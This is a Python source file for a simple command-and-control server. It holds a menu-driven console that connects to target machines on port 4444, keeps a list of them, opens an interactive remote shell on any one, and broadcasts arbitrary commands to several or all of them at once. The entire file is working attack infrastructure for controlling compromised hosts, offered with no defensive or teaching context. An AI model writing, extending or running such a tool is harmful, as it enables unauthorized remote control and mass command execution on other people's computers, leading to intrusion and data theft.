import socket
import time

PORT = 4444
connections = {}

def menu():
    print("\n==== C2 Server Menu ====")
    print("1. Add Connection")
    print("2. Show Connections")
    print("3. Connect to Single Machine")
    print("4. Broadcast Command")
    print("5. Remove Connection")
    print("6. Exit")
    print("========================")

def add_connection():
    name = input("Enter connection name: ")
    ip = input("Enter target IP address: ")
    print(f"[*] Trying to connect to {ip}:{PORT}...")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, PORT))
        connections[name] = {'ip': ip, 'socket': sock}
        print(f"[+] Connection '{name}' added successfully.")
    except Exception as e:
        print(f"[!] Failed to connect to {ip}:{PORT} -> {e}")

def show_connections():
    if not connections:
        print("[!] No active connections.")
        return
    print("\n--- Active Connections ---")
    for i, (name, info) in enumerate(connections.items(), start=1):
        print(f"{i}. {name} ({info['ip']}:{PORT})")
    print("--------------------------")

def handle_broken_connection(name):
    print(f"[!] Connection to '{name}' appears dead.")
    print("1. Delete connection")
    print("2. Retry")
    choice = input("Choose (1/2): ").strip()

    if choice == "1":
        try:
            connections[name]['socket'].close()
        except:
            pass
        del connections[name]
        print(f"[-] Connection '{name}' removed.")
    elif choice == "2":
        ip = connections[name]['ip']
        print(f"[*] Retrying connection to {ip}:{PORT}...")
        try:
            new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            new_sock.connect((ip, PORT))
            connections[name]['socket'] = new_sock
            print(f"[+] Reconnected to '{name}' successfully.")
        except Exception as e:
            print(f"[!] Retry failed: {e}")

def connect_single():
    show_connections()
    index = int(input("Select connection number to interact: ")) - 1
    if index < 0 or index >= len(connections):
        print("[!] Invalid selection.")
        return
    name = list(connections.keys())[index]
    sock = connections[name]['socket']
    print(f"[+] Connected to '{name}' shell. Type 'exit' to return.")

    while True:
        cmd = input(f"{name}> ")
        if cmd.lower() == "exit":
            break
        try:
            sock.send(cmd.encode())
            data = sock.recv(4096).decode()
            print(data, end="")
        except Exception as e:
            handle_broken_connection(name)
            break

def broadcast():
    if not connections:
        print("[!] No active connections.")
        return

    print("1. Selected machines")
    print("2. All machines")
    choice = input("Select option: ").strip()

    targets = []

    if choice == "1":
        show_connections()
        indices = input("Enter machine numbers (comma-separated): ").split(',')
        for i in indices:
            try:
                idx = int(i.strip()) - 1
                name = list(connections.keys())[idx]
                targets.append(name)
            except:
                print(f"[!] Invalid index: {i}")
    elif choice == "2":
        targets = list(connections.keys())
    else:
        print("[!] Invalid choice.")
        return

    cmd = input("Enter command to broadcast: ")
    for name in targets:
        try:
            sock = connections[name]['socket']
            sock.send(cmd.encode())
            data = sock.recv(4096).decode()
            print(f"\n[{name}] >>> {data}")
        except Exception:
            handle_broken_connection(name)

def remove_connection():
    show_connections()
    index = int(input("Select connection to remove: ")) - 1
    if index < 0 or index >= len(connections):
        print("[!] Invalid index.")
        return
    name = list(connections.keys())[index]
    try:
        connections[name]['socket'].close()
    except:
        pass
    del connections[name]
    print(f"[+] Removed connection '{name}'")

def main():
    while True:
        menu()
        choice = input("Enter your choice: ").strip()
        if choice == "1":
            add_connection()
        elif choice == "2":
            show_connections()
        elif choice == "3":
            connect_single()
        elif choice == "4":
            broadcast()
        elif choice == "5":
            remove_connection()
        elif choice == "6":
            print("[*] Exiting C2 server...")
            for conn in connections.values():
                try:
                    conn['socket'].close()
                except:
                    pass
            break
        else:
            print("[!] Invalid choice.")

if __name__ == "__main__":
    main()
